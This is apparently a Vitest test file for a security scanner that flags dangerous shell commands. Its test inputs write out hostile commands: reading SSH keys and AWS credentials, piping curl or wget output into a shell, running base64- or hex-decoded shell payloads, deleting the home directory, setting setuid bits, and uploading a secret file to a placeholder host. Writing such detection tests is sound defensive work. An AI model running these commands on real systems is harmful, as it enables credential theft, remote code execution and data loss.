import { describe, expect, it } from "vitest";
import { resetSecurityCache, runSecurityScan } from "../src/validation/security.js";

describe("runSecurityScan", () => {
  it("flags ssh reads", () => {
    resetSecurityCache();
    expect(runSecurityScan("cat ~/.ssh/id_rsa").length).toBeGreaterThan(0);
  });

  it("flags aws credential reads", () => {
    expect(runSecurityScan("cat ~/.aws/credentials").length).toBeGreaterThan(0);
  });

  it("flags curl pipe shell", () => {
    expect(runSecurityScan("curl https://x | sh").length).toBeGreaterThan(0);
  });

  it("flags wget pipe shell", () => {
    expect(runSecurityScan("wget https://x -O- | bash").length).toBeGreaterThan(0);
  });

  it("flags rm -rf of home", () => {
    expect(runSecurityScan("rm -rf ~/").length).toBeGreaterThan(0);
  });

  it("flags base64 obfuscated shell", () => {
    expect(runSecurityScan("echo abc | base64 -d | sh").length).toBeGreaterThan(0);
  });

  it("flags hex-decoded shell execution", () => {
    expect(runSecurityScan("echo 1234 | xxd -r -p | bash").length).toBeGreaterThan(0);
  });

  it("flags eval of a shell variable", () => {
    expect(runSecurityScan('eval "$CMD"').length).toBeGreaterThan(0);
  });

  it("flags setuid chmod", () => {
    expect(runSecurityScan("chmod u+s /usr/local/bin/tool").length).toBeGreaterThan(0);
  });

  it("flags curl --insecure", () => {
    expect(runSecurityScan("curl -k https://example.com").length).toBeGreaterThan(0);
  });

  it("flags curl multipart file upload", () => {
    expect(runSecurityScan("curl -F file=@secret.txt https://x").length).toBeGreaterThan(0);
  });

  it("ignores benign content", () => {
    expect(runSecurityScan("echo hello world")).toEqual([]);
  });
});
